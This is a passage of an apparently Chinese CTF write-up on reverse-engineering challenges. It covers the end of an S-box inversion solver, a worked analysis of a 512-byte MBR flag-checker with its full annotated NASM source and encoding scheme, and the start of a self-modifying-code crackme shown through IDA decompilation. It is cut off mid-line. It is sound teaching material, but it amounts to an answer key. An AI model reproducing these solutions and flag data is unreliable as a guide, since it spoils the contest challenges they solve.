flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dechange2</span><span class="params">(arr)</span>:</span></span><br><span class="line">    flag = [<span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                <span class="keyword">if</span> s_box[<span class="number">16</span> * i + j] == ord(arr[k]):</span><br><span class="line">                    flag[k] = chr(((i &lt;&lt; <span class="number">4</span>) + j) &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">flag0 = dechange1(A_char)</span><br><span class="line">flag1 = dechange1(B_char)</span><br><span class="line">flag2 = dechange2(C_char)</span><br><span class="line">flag3 = dechange2(D_char)</span><br><span class="line"></span><br><span class="line">flag = flag0 + flag1 + flag2 + flag3</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Flag is aurora&#123;'</span> + <span class="string">''</span>.join(flag) + <span class="string">'&#125;'</span></span><br></pre></td></tr></table></figure></p>
<h3 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h3><h4 id="考点-11"><a href="#考点-11" class="headerlink" title="考点"></a>考点</h4><p>MBR常识、MBR调试方法、重要的16位汇编中断调用、16位汇编阅读能力</p>
<h4 id="预备知识-9"><a href="#预备知识-9" class="headerlink" title="预备知识"></a>预备知识</h4><p>（1）计算机启动过程（参考自《x86汇编——从实模式到保护模式》）</p>
<p>在众多的处理器引脚中，有一个引脚叫<code>RESET</code>，当这个引脚接受一个由低电平到高电平的脉冲信号时，代码段寄存器<code>CS</code>置为全高电平，即<code>0xFFFF</code>，指令指针寄存器<code>IP</code>置为全低电平，即<code>0x0000</code>，如果你学过数电中的时序逻辑电路的话，应该能很好地理解上面的过程。当你按开机键时就会给<code>RESET</code>一个脉冲，早期的一些电脑还有一个<code>RESET</code>键，为了保证死机的时候可以强制重启，实际上也是触发<code>RESET</code>信号。</p>
<p>我们知道，内存在断电后信息都会消失，因此我们不可能刚加电就去读内存地址，因此需要先读<code>只读存储器</code>，只读存储器的信息是一出厂就刻录好的，除了部分比特位可以通过电擦除改变值以外，大部分信息是不可改变的，但优点在于只读存储器的信息不需要电来维持。计算机刚启动时处理器处于实模式状态，实模式需要通过段地址加偏移地址来寻址，段地址左移4位加偏移地址就得到线性地址，最大寻址空间为1M，而1M地址中的最高64KB区域被分配给了只读存储器，因此<code>FFFF:0000</code>访问到的是只读存储器区域。</p>
<p><code>FFFF:0000</code>的线性地址是<code>FFFF0</code>，仅有16字节的空间可写了，所以这个地方通常是一个<code>jmp</code>指令，跳转到其他地方去执行。</p>
<p>这个只读存储器就是<code>BIOS</code>，它的功能主要是诊断、检测和初始化，中间到底做了什么事并不关键，关键在于<code>BIOS</code>做的最后一件事。如果选择的是硬盘启动，那么<code>BIOS</code>会读取硬盘中的0柱面0磁头1扇区的512字节内容加载进内存地址<code>0000:7C00</code>处，加载完成后，通过一个远跳转指令<code>jmp 0x0000:0x7c00</code>跳转到这个地址，执行<code>BIOS</code>加载的内容，此时<code>BIOS</code>的使命结束。0柱面0磁头1扇区的内容就是主引导记录，即<code>MBR</code></p>
<p>（2）MBR的特点</p>
<ul>
<li>MBR是1个扇区的内容，故MBR大小为512字节；</li>
<li>一个有效的MBR，最末两字节必须是<code>55 AA</code>；</li>
<li>MBR加载的内存地址是<code>0x0000:0x7C00</code>；</li>
<li>MBR通常是由操作系统负责的，但如果我们有一个虚拟机，能模拟一个硬盘，在该虚拟硬盘的0柱面0磁头1扇区处填写一个扇区的指令，那么这段指令必然会执行。这种特性通常用于MBR和实模式程序的调试。</li>
</ul>
<p>（3）MBR调试方法</p>
<p>关于MBR的调试，通常需要用虚拟机，而且还要有调试功能。一般选择<code>boch</code>或<code>qemu</code>，这里我主要介绍<code>qemu</code>。</p>
<p>首先通过<code>apt</code>或<code>rpm</code>安装<code>qemu-system</code>，它会安装各种架构的虚拟机，比如<code>arm</code>，<code>mips</code>等。我们选择<code>qemu-system-i386</code>即可。</p>
<p>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -drive format=raw,file=binary.bin</span><br></pre></td></tr></table></figure></p>
<p>即可运行MBR程序，<code>binary.bin</code>是要运行的MBR文件。若需要调试，还需要加<code>-s</code>参数。此时会运行一个<code>gdb server</code>在1234端口，这时候可以打开<code>gdb</code>输入以下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(gdb) set architecture i8086</span><br><span class="line">warning: A handler for the OS ABI &quot;GNU/Linux&quot; is not built into this configuration</span><br><span class="line">of GDB.  Attempting to continue with the default i8086 settings.</span><br><span class="line"></span><br><span class="line">The target architecture is assumed to be i8086</span><br><span class="line">(gdb) set disassembly-flavor intel</span><br><span class="line">(gdb) target remote:1234</span><br><span class="line">Remote debugging using :1234</span><br></pre></td></tr></table></figure></p>
<p>再下断点即可调试了。由于是运行了一个<code>gdb server</code>，因此也可以用IDA的<code>Remote GDB Server</code>进行远程调试，只要输入对应的IP和端口1234就可以了。</p>
<p>（4）重要的16位汇编中断调用</p>
<ul>
<li>字符串输出</li>
</ul>
<p>当使用中断调用号<code>int 10h</code>，且设置功能号<code>AH = 13h</code>时，可在实模式下输出指定内存地址的字符串，并可设置光标位置、输出属性等。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BH＝页码</span><br><span class="line">BL＝属性(若AL=00H或 01H)</span><br><span class="line">CX＝显示字符串长度</span><br><span class="line">(DH、DL)＝坐标(行、列)</span><br><span class="line">ES:BP＝显示字符串的地址</span><br><span class="line">AL＝显示输出方式</span><br><span class="line">  0——字符串中只含显示字符，其显示属性在BL中。显示后，光标位置不变</span><br><span class="line">  1——字符串中只含显示字符，其显示属性在BL中。显示后，光标位置改变</span><br><span class="line">  2——字符串中含显示字符和显示属性。显示后，光标位置不变</span><br><span class="line">  3——字符串中含显示字符和显示属性。显示后，光标位置改变</span><br></pre></td></tr></table></figure></p>
<p>例如下面的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov     ax, 1300h</span><br><span class="line">mov     bh, 0</span><br><span class="line">mov     bl, ds:4400h</span><br><span class="line">mov     cx, 11h</span><br><span class="line">mov     dx, 90Ch</span><br><span class="line">mov     bp, 7D31h</span><br><span class="line">int     10h</span><br></pre></td></tr></table></figure></p>
<p>可以看出，要输出的字符串在<code>es:7D31h</code>处，长度为<code>0x11</code>字节，输出的坐标在<code>0x9</code>行<code>0xc</code>列，属性信息存在<code>ds:4400h</code>处。</p>
<ul>
<li>字符输入</li>
</ul>
<p>字符输入通常使用键盘I/O中断调用，即<code>int 16h</code>，设置功能号<code>AH = 0</code>表示监听键盘输入，一旦有键盘敲击，则会将敲击的字符对应的ASCII码存入<code>AL</code>寄存器中，典型的应用如同<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor     ah, ah</span><br><span class="line">int     16h</span><br></pre></td></tr></table></figure></p>
<ul>
<li>延时</li>
</ul>
<p>当中断调用号<code>int 15h</code>，且功能号<code>AH = 86h</code>时，<code>CX:DX</code>存放的是延时，单位微秒，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     cx, 1</span><br><span class="line">xor     dx, dx</span><br><span class="line">mov     ah, 86h</span><br><span class="line">int     15h</span><br></pre></td></tr></table></figure></p>
<p>表示延时10000h微秒，即65536微秒，即65.536毫秒</p>
<h4 id="解题过程-11"><a href="#解题过程-11" class="headerlink" title="解题过程"></a>解题过程</h4><p>首先拿到文件，拖进IDA发现不能被识别为可执行格式，用<code>Winhex</code>打开发现是一个512字节纯二进制文件，因此第一步就是要搞清楚这是一个什么东西。如果你有经验的话，发现它是512字节，且最末两字节是<code>55 AA</code>，就可以反应过来是MBR；如果没经验，可以用Linux中的<code>file</code>工具识别一下，也可以识别出是MBR。因为处理器在执行MBR时处于实模式，所以需要用16位汇编的格式去解析它，还有就是基址是<code>0x0000:0x7c00</code>。拖到IDA里面，先设置基址的偏移为<code>0x7c00</code></p>
<p><img src="https://i.imgur.com/cJAwKGp.png" alt></p>
<p>点击<code>OK</code>后，要选择16位模式，所以要点<code>No</code>，进入IDA后，光标点在最开头的位置按下P键建立函数，即可按空格键来回从文本模式到控制流图模式进行切换</p>
<p>当你了解了预备知识的那些内容后，剩下的就是看选手的16位汇编阅读能力了，可以通过动态调试，慢慢观察值的变化。</p>
<p>程序的逻辑是，首先有一个映射关系，分别由<code>table1</code>和<code>table1_</code>两个表来存储，位置一一对应。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">table1        table1_</span><br><span class="line">31       -&gt;     fc09</span><br><span class="line">7a       -&gt;     9611</span><br><span class="line">3f       -&gt;     cc89</span><br><span class="line">2b       -&gt;     0051</span><br><span class="line">18       -&gt;     07bd</span><br><span class="line">27       -&gt;     d92d</span><br><span class="line">38       -&gt;     a121</span><br><span class="line">64       -&gt;     2991</span><br><span class="line">67       -&gt;     86ad</span><br><span class="line">7b       -&gt;     b7ca</span><br><span class="line">56       -&gt;     166c</span><br><span class="line">1d       -&gt;     4983</span><br><span class="line">79       -&gt;     adeb</span><br><span class="line">2f       -&gt;     e5f6</span><br><span class="line">0f       -&gt;     ff0a</span><br><span class="line">66       -&gt;     a05e</span><br><span class="line">57       -&gt;     7716</span><br><span class="line">2d       -&gt;     5ac6</span><br></pre></td></tr></table></figure></p>
<p>然后存有一个加密flag串<code>encflag</code>，存的数据全部是<code>table1_</code>集合里面的值，程序首先依据映射关系将<code>encflag</code>替换为<code>encflag_sub</code>，最后将<code>encflag_sub</code>与加密后的输入字符串进行比较。</p>
<p>输入字符串存储在地址0x4321中，对于输入字符串的加密方式非常简单，就是单个字符先异或0x59，再加4，再异或0x17，就完成了加密。</p>
<p>程序源码及注释如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">[bits 16]</span><br><span class="line">	mov ax, 13h</span><br><span class="line">	int 10h        ;设置显示模式为640*480 256色</span><br><span class="line">	mov eax, cr0</span><br><span class="line">	and ax, 0fffbh</span><br><span class="line">	or ax, 2</span><br><span class="line">	mov cr0, eax   ;关闭保护模式，打开协处理器监控位MP，使得任务切换时WAIT指令会产生异常</span><br><span class="line">	mov bx, 0 </span><br><span class="line">L1:</span><br><span class="line">	mov byte [bx + 4321h], &apos;_&apos;</span><br><span class="line">	inc bx</span><br><span class="line">	cmp bx, 25</span><br><span class="line">	jle L1        ;在0x4321位置处加载25个下划线</span><br><span class="line">	mov byte [7c00h + iter], 0</span><br><span class="line">DISPLAY:</span><br><span class="line">	mov cx, 1</span><br><span class="line">	xor dx, dx</span><br><span class="line">	mov ah, 86h</span><br><span class="line">	int 15h       ;延迟65.536毫秒</span><br><span class="line"></span><br><span class="line">	add byte [4400h], 10h</span><br><span class="line">	mov ax, 1300h</span><br><span class="line">	mov bh, 0</span><br><span class="line">	mov bl, byte [4400h]</span><br><span class="line">	mov cx, 17</span><br><span class="line">	mov dx, 90ch</span><br><span class="line">	mov bp, 7c00h + string</span><br><span class="line">	int 10h       ;输出变量string内容，长度17</span><br><span class="line"></span><br><span class="line">	mov ax, 1300h</span><br><span class="line">	mov bx, 0fh</span><br><span class="line">	mov cx, 25</span><br><span class="line">	mov dx, 0c08h</span><br><span class="line">	mov bp, 4321h</span><br><span class="line">	int 10h       ;输出地址4321h处的字符串</span><br><span class="line"></span><br><span class="line">	cmp byte [7c00h + iter], 24</span><br><span class="line">	jle INPUTFLAG ;输入字符，最大长度25</span><br><span class="line"></span><br><span class="line">	;   =======   核心算法   =======</span><br><span class="line"></span><br><span class="line">	xor bx, bx</span><br><span class="line">L2:</span><br><span class="line">	shl bx, 1</span><br><span class="line">	mov si, [7c00h + encflag + bx]</span><br><span class="line">	shr bx, 1         ;取出encflag[i]</span><br><span class="line">	xor bp, bp</span><br><span class="line">L3:</span><br><span class="line">	shl bp, 1</span><br><span class="line">	mov di, [7c00h + table1_ + bp]</span><br><span class="line">	shr bp, 1         ;取出table1_[i]</span><br><span class="line">	cmp si, di        ;比对encflag[i]与table1_[i]的值</span><br><span class="line">	je L4             ;如果相同，跳入L4</span><br><span class="line">	inc bp            ;否则i++，继续搜寻</span><br><span class="line">	cmp bp, 18</span><br><span class="line">	jl L3</span><br><span class="line">L4:</span><br><span class="line">	mov dl, [7c00h + table1 + bp]        ;bp存放着索引值i</span><br><span class="line">	mov [7c00h + encflag_sub + bx], dl   ;取出table1[i]到encflag_sub中</span><br><span class="line">	inc bx</span><br><span class="line">	cmp bx, 25</span><br><span class="line">	jl L2</span><br><span class="line">	xor bx, bx</span><br><span class="line">L5:</span><br><span class="line">	mov dl, [4321h + bx]     ;取出输入字符input[j]</span><br><span class="line">	xor dl, 0x59             ;将该字符异或0x59</span><br><span class="line">	add dl, 4                ;再将该字符加4</span><br><span class="line">	xor dl, 0x17             ;再将该字符异或0x17</span><br><span class="line">	mov dh, [7c00h + encflag_sub + bx]   ;取出encflag_sub[j]</span><br><span class="line">	cmp dh, dl               ;将input[j]与encflag_sub[j]比较</span><br><span class="line">	jne WRONG                ;如果不同，则flag错误，直接结束</span><br><span class="line">	inc bx                   ;否则j++，继续比对</span><br><span class="line">	cmp bx, 25</span><br><span class="line">	jl L5</span><br><span class="line">	jmp RIGHT                ;所有字符都比对成功时，flag正确</span><br><span class="line"></span><br><span class="line">	;   ======   核心算法结束   ======</span><br><span class="line"></span><br><span class="line">INPUTFLAG:</span><br><span class="line">	mov ah, 1</span><br><span class="line">	int 16h          ;检查键盘缓冲区是否空了</span><br><span class="line">	jz DISPLAY</span><br><span class="line">	xor ah, ah</span><br><span class="line">	int 16h          ;监听键盘输入字符</span><br><span class="line">	cmp al, 8        ;ASCII码为8表示退格键，做退格处理</span><br><span class="line">	jz BACKSPACE</span><br><span class="line">	cmp al, 0dh      ;ASCII码为13表示回车，不记录进内存</span><br><span class="line">	jz DISPLAY</span><br><span class="line">	mov bx, 4321h    ;除了以上两个字符，其余字符记录进首地址0x4321处</span><br><span class="line">	mov cl, [7c00h + iter]</span><br><span class="line">	add bx, cx</span><br><span class="line">	mov [bx], al</span><br><span class="line">	inc byte [7c00h + iter]</span><br><span class="line">	jmp DISPLAY</span><br><span class="line">OUTPUTRESULT:        ;输出验证结果，会有一个动画效果</span><br><span class="line">	xor bh, bh</span><br><span class="line">	mov bl, [7c00h + iteroutput]</span><br><span class="line">	cmp bx, 17</span><br><span class="line">	jge DISPLAY</span><br><span class="line">	mov cl, [bx + di]</span><br><span class="line">	mov [bx + string + 7c00h], cl</span><br><span class="line">	inc byte [7c00h + iteroutput]</span><br><span class="line">	mov dword [bx + 1 + string + 7c00h], &apos;&gt;== &apos;</span><br><span class="line">	jmp DISPLAY</span><br><span class="line">BACKSPACE:           ;退格键的处理</span><br><span class="line">	cmp byte [7c00h + iter], 1</span><br><span class="line">	jl DISPLAY</span><br><span class="line">	mov ax, 4321h</span><br><span class="line">	dec byte [7c00h + iter]</span><br><span class="line">	mov bl, [7c00h + iter]</span><br><span class="line">	add bx, ax</span><br><span class="line">	mov byte [bx], &apos;_&apos;</span><br><span class="line">	jmp DISPLAY</span><br><span class="line">WRONG:               ;flag错误的输出</span><br><span class="line">	mov byte [4400h], 4</span><br><span class="line">	mov di, 7c00h + wrongflag</span><br><span class="line">	jmp OUTPUTRESULT</span><br><span class="line">RIGHT:               ;flag正确的输出</span><br><span class="line">	mov byte [4400h], 0ah</span><br><span class="line">	mov di, 7c00h + rightflag</span><br><span class="line">	jmp OUTPUTRESULT</span><br><span class="line"></span><br><span class="line">	align 10h</span><br><span class="line"></span><br><span class="line">	iter db 0</span><br><span class="line">	string db &apos;please input flag&apos;, 0</span><br><span class="line">	wrongflag db &apos;##You are WRONG##&apos;, 0</span><br><span class="line">	rightflag db &apos;##You are RIGHT##&apos;, 0</span><br><span class="line">	iteroutput db 0</span><br><span class="line"></span><br><span class="line">	align 10h</span><br><span class="line"></span><br><span class="line">	encflag dw 0x0051, 0xd92d, 0xa121, 0x5ac6, 0xa121, 0x0051, 0xfc09, 0x07bd, 0x7716, 0xa05e, 0xb7ca, 0x4983, 0xe5f6, 0x9611, 0x166c, 0xadeb, 0x4983, 0x0051, 0x86ad, 0xe5f6, 0x4983, 0xff0a, 0x2991, 0xa121, 0xcc89</span><br><span class="line">	table1 db 0x31, 0x7a, 0x3f, 0x2b, 0x18, 0x27, 0x38, 0x64, 0x67, 0x7b, 0x56, 0x1d, 0x79, 0x2f, 0x0f, 0x66, 0x57, 0x2d</span><br><span class="line">	table1_ dw 0xfc09, 0x9611, 0xcc89, 0x0051, 0x07bd, 0xd92d, 0xa121, 0x2991, 0x86ad, 0xb7ca, 0x166c, 0x4983, 0xadeb, 0xe5f6, 0xff0a, 0xa05e, 0x7716, 0x5ac6</span><br><span class="line"></span><br><span class="line">	align 10h</span><br><span class="line"></span><br><span class="line">encflag_sub:</span><br><span class="line">	times 510-($-$$) db 0</span><br><span class="line">	db 0x55, 0xaa</span><br></pre></td></tr></table></figure></p>
<h3 id="whitegive"><a href="#whitegive" class="headerlink" title="whitegive"></a>whitegive</h3><p><del>题如其名，白给。</del> 三层smc，放在Linux系统下使用IDA的远程动态调试跟进最后来到：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_400697</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+11h] [rbp-2Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+12h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+13h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+15h] [rbp-2Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+16h] [rbp-2Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+17h] [rbp-29h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+19h] [rbp-27h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+1Ah] [rbp-26h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+1Bh] [rbp-25h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+1Dh] [rbp-23h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+1Eh] [rbp-22h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+1Fh] [rbp-21h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+21h] [rbp-1Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+22h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+23h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+25h] [rbp-1Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+26h] [rbp-1Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [rsp+27h] [rbp-19h]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [rsp+29h] [rbp-17h]</span></span><br><span class="line">  <span class="keyword">char</span> v28; <span class="comment">// [rsp+2Ah] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v29; <span class="comment">// [rsp+2Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v31; <span class="comment">// [rsp+2Dh] [rbp-13h]</span></span><br><span class="line">  <span class="keyword">char</span> v32; <span class="comment">// [rsp+2Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">char</span> v33; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">char</span> v34; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v35; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v35 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="number">2</span>;</span><br><span class="line">  v3 = <span class="number">22</span>;</span><br><span class="line">  v4 = <span class="number">17</span>;</span><br><span class="line">  v5 = <span class="number">12</span>;</span><br><span class="line">  v6 = <span class="number">17</span>;</span><br><span class="line">  v7 = <span class="number">2</span>;</span><br><span class="line">  v8 = <span class="number">24</span>;</span><br><span class="line">  v9 = <span class="number">8</span>;</span><br><span class="line">  v10 = <span class="number">6</span>;</span><br><span class="line">  v11 = <span class="number">6</span>;</span><br><span class="line">  v12 = <span class="number">19</span>;</span><br><span class="line">  v13 = <span class="number">60</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">87</span>;</span><br><span class="line">  v16 = <span class="number">82</span>;</span><br><span class="line">  v17 = <span class="number">14</span>;</span><br><span class="line">  v18 = <span class="number">60</span>;</span><br><span class="line">  v19 = <span class="number">87</span>;</span><br><span class="line">  v20 = <span class="number">45</span>;</span><br><span class="line">  v21 = <span class="number">7</span>;</span><br><span class="line">  v22 = <span class="number">60</span>;</span><br><span class="line">  v23 = <span class="number">86</span>;</span><br><span class="line">  v24 = <span class="number">22</span>;</span><br><span class="line">  v25 = <span class="number">1</span>;</span><br><span class="line">  v26 = <span class="number">14</span>;</span><br><span class="line">  v27 = <span class="number">10</span>;</span><br><span class="line">  v28 = <span class="number">84</span>;</span><br><span class="line">  v29 = <span class="number">60</span>;</span><br><span class="line">  v30 = <span class="number">37</span>;</span><br><span class="line">  v31 = <span class="number">82</span>;</span><br><span class="line">  v32 = <span class="number">87</span>;</span><br><span class="line">  v33 = <span class="number">90</span>;</span><br><span class="line">  v34 = <span class="number">30</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; byte_601080[i]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_601080[i] ^= <span class="number">0x63</span>u;</span><br><span class="line">    <span class="keyword">if</span> ( byte_601080[i] != *(&amp;v2 + i) )</span><br><span 